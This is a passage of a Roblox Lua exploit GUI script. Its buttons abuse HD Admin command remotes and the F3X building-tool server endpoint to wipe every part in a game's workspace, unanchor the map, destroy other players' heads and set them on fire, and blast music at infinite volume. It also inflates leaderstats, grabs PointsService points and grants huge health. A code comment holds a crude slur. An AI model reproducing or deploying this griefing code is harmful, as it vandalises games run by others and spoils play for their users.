		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Disco Fog"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";fog 999999")
			while true do
				RequestCommandSilent:InvokeServer(";fogcolor red")
				wait(2)
				RequestCommandSilent:InvokeServer(";fogcolor blue")
				wait(2)
				RequestCommandSilent:InvokeServer(";fogcolor green")
				wait(2)
				RequestCommandSilent:InvokeServer(";fogcolor yellow")
				wait(2)
				RequestCommandSilent:InvokeServer(";fogcolor pink")
				wait(2)
				RequestCommandSilent:InvokeServer(";fogcolor orange")
				wait(2)
				RequestCommandSilent:InvokeServer(";fogcolor purple")
				wait(2)
			end
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Fencing Restore"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Fencing Restore"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
	
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer
	
			local character = player.Character or player.CharacterAdded:Wait()
	
			local storedCharacter = character
			local originalParent = storedCharacter.Parent
	
			storedCharacter.Parent = nil
	
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
	
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
	
				return nil
			end
	
			-- get all info
	
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
	
			local function delete(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function deleteall()
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") or v:IsA("UnionOperation") then
						spawn(function()
							delete(v)
						end)
					end
				end
			end
	
			deleteall()
	
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				return nil
			end
	
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
	
			function _(args)
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function addlight(part, brightness)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight"
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function synclight(part, brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight",
							["Range"] = 60,
							["Color"] = Color3.new(1, 0, 0)
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function fire(part) 
	
				local argsCreate = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire"
						}
					}
				}
	
	
				local argsSync = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire",
							["Size"] = 30,
							["Heat"] = 9,
							["Color"] = Color3.fromRGB(255, 0, 0), 
							["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
						} 
					} 
				}
	
	
				_(argsCreate)
				_(argsSync)
			end
			function MovePart(part, cf)
				local args = {
					"SyncMove",
					{
						{
							Part = part,
							CFrame = cf
						}
					}
				}
				_(args)
			end
	
			local function resize(part, size, cf)
				local args = {
					"SyncResize",
					{
						{
							Part = part,
							CFrame = cf,
							Size = size
						}
					}
				}
				_(args)
			end
	
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
	
			local function mat(part, mate)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Material = mate
						}
					}
				}
				_(args)
			end
	
			local function transparency(part, trans)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Transparency = trans
						}
					}
				}
				_(args)
			end
	
			local function color(part, color)
				local args = {
					"SyncColor",
					{
						{
							Part = part,
							Color = color,
							UnionColoring = false
						}
					}
				}
				_(args)
			end
	
			local function syncmeshid(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							MeshId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
	
			local function makemesh(part)
				local args = {
					"CreateMeshes",
					{
						{
							Part = part
						}
					}
				}
				_(args)
			end
	
			local function syncmeshsize(part, vectora)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							Scale = vectora
						}
					}
				}
				_(args)
			end
	
			local function syncmeshtexture(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							TextureId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
	
			local function name(part, stringa)
				local args = {
					"SetName",
					{ part },
					stringa
				}
				_(args)
			end
	
			local function lock(part, boolean)
				local args = {
					"SetLocked",
					{ part },
					boolean
				}
				_(args)
			end
	
	
	
			local function setcollision(part, booleana)
				local args = {
					"SyncCollision",
					{
						{
							Part = part,
							CanCollide = booleana
						}
					}
				}
				_(args)
			end
	
			local function setanchor(part, boolean)
				local args = {
					"SyncAnchor",
					{
						{
							Part = part,
							Anchored = boolean
						}
					}
				}
				_(args)
			end
	
			local function createdecal(part, side)
				local args = {
					"CreateTextures",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal"
						}
					}
				}
				_(args)
			end
	
			local function setdecal(part, asset, side)
				local args = {
					"SyncTexture",
					{
						{
							Part = part,
							Face = side,
							TextureType = "Decal",
							Texture = "rbxassetid://" .. asset
						}
					}
				}
				_(args)
			end
	
			function toptexturecreate(part)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture"
						}
					}
				}
	
				_(args)
			end
			function toptextureadd(part)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = Enum.NormalId.Top,
							["TextureType"] = "Texture",
							["Texture"] = "rbxassetid://13199422086",
							["StudsPerTileV"] = 2,
							["StudsPerTileU"] = 2
						}
					}
				}
				_(args)
			end
	
			local function RealmV2()
				local position = CFrame.new(0, 0, 0)
				local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
				resize(base, Vector3.new(1000, 1, 1000), position)
				toptexturecreate(base)
				toptextureadd(base)
				color(base, Color3.fromRGB(0, 150, 0))
	
			end
			local function unanchorall()
				for _, v in ipairs(workspace:GetDescendants()) do
					if v:IsA("BasePart") or v:IsA("UnionOperation") then
						spawn(function()
							lock(v, false)
							setanchor(false, v)
						end)
					end
				end
			end
	
			local function realm()
				unanchorall()
				RealmV2()
			end
			realm()
			wait(1)
			storedCharacter.Parent = game.workspace
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Leaderstat Add"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Leaderstat Add"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			while true do
				wait(.1)
				game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Name"].TextBox.Text).Value = game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Name"].TextBox.Text)+game.Players.LocalPlayer.leaderstats:FindFirstChild(frame.Settings.Page2["Leaderstat Amount"].TextBox.Text)	
			end
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Leaderstat Change"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Leaderstat Change"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";createTeam Red c00lkidd")
	
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Play Music"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Play Music"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local musicid = game:GetService("CoreGui").CoolGui.Frame.Settings.Page1["Music ID"].TextBox.text
			local pitch4music = game:GetService("CoreGui").CoolGui.Frame.Settings.Page1["Music Pitch"].TextBox.text
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";music  " .. musicid  .. "  ;volume inf ;pitch " .. pitch4music)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Restore Skybox"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Restore Skybox"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";time 10")
	
			local function findBuildingTools()
				local player = game:GetService("Players").LocalPlayer
	
				for _, item in ipairs(player.Character:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
						return item
					end
				end
	
				return nil
			end
	
			local buildingTools = findBuildingTools()
			if not buildingTools then
				warn("btools not found")
				return
			end
	
			local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
			local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
	
			if not serverEndpoint then
				warn("btools not found")
				return
			end
	
			local skyInstance = workspace:FindFirstChild("E")
			if not skyInstance then
				print"ok"
			end
	
			local args = {
				"Remove",                
				{ skyInstance }           
			}
	
			local success, result
			if serverEndpoint:IsA("RemoteFunction") then
				success, result = pcall(function()
					return serverEndpoint:InvokeServer(unpack(args))
				end)
			else
	
				serverEndpoint:FireServer(unpack(args))
				success = true
			end
	
			if success then
	
				print"yay"
	
			end
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Steal Player Points"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Steal Player Points"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local service = game:GetService("PointsService")
			service:AwardPoints(game.Players.LocalPlayer.userId, service:GetAwardablePoints())
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 3
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
	
		-- Local Player --
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Anti-Robloxian"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Anti-Robloxian"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local originalChar = player.Character or player.CharacterAdded:Wait()
			local tool
			while player.Character == originalChar do
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function DestroyPart(part)
					spawn(function()
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end)
				end
	
				function AddDecor(part, dec)
					spawn(function()
						local args = {
							[1] = "CreateDecorations",
							[2] = {
								[1] = {
									["Part"] = part,
									["DecorationType"] = dec
								}
							}
						}
						_(args)
					end)
				end
	
				function a()
					local dist = 17
					local distance = dist
					local Player = game.Players.LocalPlayer
	
					if Player then
						local c = game.Players:GetChildren()
						for i = 1, #c do
							if c[i].Name ~= Player.Name then
								if c[i].Character and c[i].Character:FindFirstChild("Head") then
									local char = c[i].Character
									local torso = game.Workspace[Player.Name]:FindFirstChild("Torso")
									if torso and c[i]:DistanceFromCharacter(torso.Position) <= distance then
										DestroyPart(char:FindFirstChild("Head"))
										for _, part in ipairs(char:GetChildren()) do
											if part:IsA("BasePart") then
												AddDecor(part, "Fire")
											end
										end
									end
								end
							end
						end
					end
				end
	
	
				spawn(a)
				wait()
			end
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Billboard Gui"
		button.Position = UDim2.new(0.5,3,0,33)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Billboard Gui"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local text = frame.Settings.Page1["Billboard Gui Text"].TextBox.Text
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";titleg me " .. text)
	
			f.TextStrokeColor3 = Color3.new(0,0,0)
			f.TextColor3 = Color3.new(frame.Settings.Page2["Billboard Gui Color"].TextBox1.Text/255,frame.Settings.Page2["Billboard Gui Color"].TextBox2.Text/255,frame.Settings.Page2["Billboard Gui Color"].TextBox3.Text/255)
			f.TextStrokeTransparency = 0
			f.TextYAlignment = "Bottom"
		end)
		--
	
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Chicken Arms"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Chicken Arms"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
	
	
	
	
	
	
	
	
	
	
	
			local RunService = game:GetService("RunService")    local Players = game:GetService("Players")
	
	
	
			local lp = Players.LocalPlayer
	
			local char = lp.Character or lp.CharacterAdded:Wait()
	
			local hum = char:WaitForChild("Humanoid")
	
			local torso = char:WaitForChild("Torso")
	
			local tool = char:FindFirstChildOfClass("Tool")
	
			if not tool then        for _, v in lp.Backpack:GetChildren() do
	
					if v:IsA("Tool") then
	
						tool = v
	
						break
	
					end
	
				end
	
			end
	
	
	
			if tool then
	
				hum:EquipTool(tool)
	
				task.delay(0.01, function()
	
					hum:UnequipTools()
	
				end)
	
			end
	
	
	
			local server = tool and tool:FindFirstChild("SyncAPI") and tool.SyncAPI:FindFirstChild("ServerEndpoint")
	
			local larm = char:WaitForChild("Left Arm")
	
			local rarm = char:WaitForChild("Right Arm")     
	
			local idleAngles = Vector3.new(0,0,math.rad(-90))
	
			local flapAmplitude = Vector3.new(0, 0, math.rad(30))
	
			local flapSpeed = 25
	
	
	
			local targetL, targetR = larm.CFrame, rarm.CFrame
	
			RunService.RenderStepped:Connect(function(delta)
	
				if not larm or not rarm then return end        local time = tick()
	
				local flapX = math.sin(time * flapSpeed) * flapAmplitude.X
	
				local flapY = math.sin(time * flapSpeed * 0.8) * flapAmplitude.Y
	
				local flapZ = math.sin(time * flapSpeed * 0.6) * flapAmplitude.Z
	
	
	
				if hum.MoveDirection.Magnitude == 0 then  
	
					targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(idleAngles.X, idleAngles.Y, idleAngles.Z)  
	
					targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-idleAngles.X, -idleAngles.Y, -idleAngles.Z)  
	
				else  
	
					targetL = torso.CFrame * CFrame.new(-1.9,0.5,0) * CFrame.Angles(flapX, flapY, idleAngles.Z + flapZ)  
	
					targetR = torso.CFrame * CFrame.new(1.9,0.5,0) * CFrame.Angles(-flapX, -flapY, -idleAngles.Z - flapZ)  
	
				end  
	
	
	
				larm.CFrame = targetL  
	
				rarm.CFrame = targetR
	
			end)
	
	
	
			if server then
	
				spawn(function()
	
					while true do
	
						if larm and rarm then
	
							server:InvokeServer("SyncMove", {{Part = larm, CFrame = larm.CFrame}})
	
							server:InvokeServer("SyncMove", {{Part = rarm, CFrame = rarm.CFrame}})
	
						end
	
						task.wait()
	
					end
	
				end)
	
			end
	
	
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer
	
			local function removeAnimate(character)
				-- Wait for the Animate script to appear (it's added by Roblox automatically)
				local animate = character:WaitForChild("Animate", 10) -- 10 second timeout just in case
				if animate then
					animate:Destroy()
				end
			end
	
	
			if player.Character then
				removeAnimate(player.Character)
			end
	
	
			player.CharacterAdded:Connect(removeAnimate)
	
	
	
	
	
	
	
	
	
			local Players = game:GetService("Players")
			local task = task or wait 
	
			local player = Players.LocalPlayer
			local currentIndex = 1
	
			local function getAllTools()
				local allTools = {}
	
				-- nugggggga
				if player.Character then
					for _, obj in ipairs(player.Character:GetChildren()) do
						if obj:IsA("Tool") then
							table.insert(allTools, obj)
						end
					end
				end
	
	
				for _, obj in ipairs(player.Backpack:GetChildren()) do
					if obj:IsA("Tool") then
						table.insert(allTools, obj)
					end
				end
	
				return allTools
			end
	
			while true do
				task.wait(0.4)
	
				local character = player.Character
				if not character or not character:FindFirstChild("Humanoid") then
					continue
				end
	
	
				local equippedTool = character:FindFirstChildWhichIsA("Tool")
				if not equippedTool then
					continue
				end
	
				local allTools = getAllTools()
				if #allTools == 0 then
					continue
				end
	
	
				table.sort(allTools, function(a, b)
					return a.Name < b.Name
				end)
	
	
				local toolToSpam = allTools[currentIndex]
	
	
				character.Humanoid:EquipTool(toolToSpam)
	
	
				toolToSpam:Activate()
	
	
				currentIndex = currentIndex + 1
				if currentIndex > #allTools then
					currentIndex = 1
				end
			end
	
	
	
	
	
	
	
	
		end)
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Disco Character"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Disco Character"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";paint me Blue")
	
	
	
	
	
	
	
	
	
	
	
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
	
			local commands = {
				";paint me blue ",
				";shirt me 8845677508",
				";shirt me 6233423251",
				";pants me 7077325122",
				";shirt me 6843262664",   
				";pants me 6144622362",
			}
	
	
			while true do
				for _, cmd in ipairs(commands) do
					RequestCommandSilent:InvokeServer(cmd)
					wait(0.3)  
				end
	
	
			end
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Dominus Ghost"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Dominus Ghost"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
	
			function nob(who,tra,hat)
				c=who.Character
				pcall(function()u=c["Body Colors"]
					u.HeadColor=BrickColor.new("Black")
					u.LeftLegColor=BrickColor.new("Black")
					u.RightLegolor=BrickColor.new("Black")
					u.LeftArmColor=BrickColor.new("Black")
					u.TorsoColor=BrickColor.new("Black")
					u.RightArmColor=BrickColor.new("Black")
				end)
				pcall(function()c.Shirt:Destroy() c.Pants:Destroy() end)
				for i,v in pairs(c:GetChildren()) do
					if v:IsA("BasePart") then
						v.Transparency=tra
						if v.Name=="HumanoidRootPart" or v.Name=="Head" then
							v.Transparency=1
						end
						wait()
						v.BrickColor=BrickColor.new("Black")
					elseif v:IsA("Hat") then
						v:Destroy()
					end
				end
				xx=game:service("InsertService"):LoadAsset(hat)
				xy=game:service("InsertService"):LoadAsset(47433)["LinkedSword"]
				xy.Parent=who.Backpack
				for a,hat in pairs(xx:children()) do
					hat.Parent=c
				end
				xx:Destroy()
				h=who.Character.Humanoid
				h.MaxHealth=50000
				wait(1.5)
				h.Health=50000
				h.WalkSpeed=32
			end
			nob(game.Players.LocalPlayer,0.6,21070012)
	
	
	
	
	
	
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Floating Pad"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Floating Pad"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanrFr = char:WaitForChild("HumanoidRootPart")
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = part
					},
					[3] = stringg
				}
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color,
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
			local cf = humanrFr.CFrame * CFrame.new(0, -1, 0)
			local pad = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
			Resize(pad, Vector3.new(10, 1, 10), cf)
			SetAnchor(true	, pad)
			SetCollision(pad, true)
			SetName(pad, "Float Pad")
			AddMesh(pad)
			SetMesh(pad, 9095618661)
			MeshResize(pad, Vector3.new(4.5, 0.5, 4.5))
			Color(pad, BrickColor.new(104).Color)
			game:GetService("RunService").RenderStepped:Connect(function()
				if pad and humanrFr then
